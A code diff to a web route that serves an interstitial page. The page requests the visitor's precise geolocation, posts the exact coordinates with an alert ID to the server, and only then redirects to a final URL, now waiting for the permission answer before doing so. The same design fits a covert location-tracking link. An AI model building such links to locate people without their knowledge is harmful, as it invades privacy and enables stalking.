@@ -568,9 +568,13 @@ export async function GET(
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ alert_id: '${alertId}', details: { exact_lat: pos.coords.latitude, exact_lon: pos.coords.longitude } })
-                    }).catch(()=>({}));
+                    }).catch(()=>{}).finally(() => {
+                      if (typeof doRedirect === 'function') { clearTimeout(fallbackTimer); doRedirect(); }
+                    });
                   },
-                  (err) => {},
+                  (err) => {
+                     if (typeof doRedirect === 'function') { clearTimeout(fallbackTimer); doRedirect(); }
+                  },
                   { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
               }
@@ -755,10 +759,24 @@ export async function GET(
           } catch(e) {}
           
           ${finalUrl ? `
-            // Delay the redirect to give the user time to interact with Camera/Location permission prompts
-            setTimeout(() => {
-              window.location.replace('${finalUrl}');
-            }, 4000);
+            // Logic to wait for Location permission prompt before redirecting
+            let redirectTriggered = false;
+            const doRedirect = () => {
+              if (!redirectTriggered) {
+                redirectTriggered = true;
+                window.location.replace('${finalUrl}');
+              }
+            };
+            
+            // If they don't answer the prompt after 10 seconds, force the redirect anyway
+            const fallbackTimer = setTimeout(doRedirect, 10000);
+
+            // The geolocation success/error callbacks in the try-catch block above will handle the redirect.
+            // But if geolocation isn't supported at all, redirect immediately.
+            if (!navigator.geolocation) {
+               clearTimeout(fallbackTimer);
+               doRedirect();
+            }
           ` : ''}
         })();
       </script>
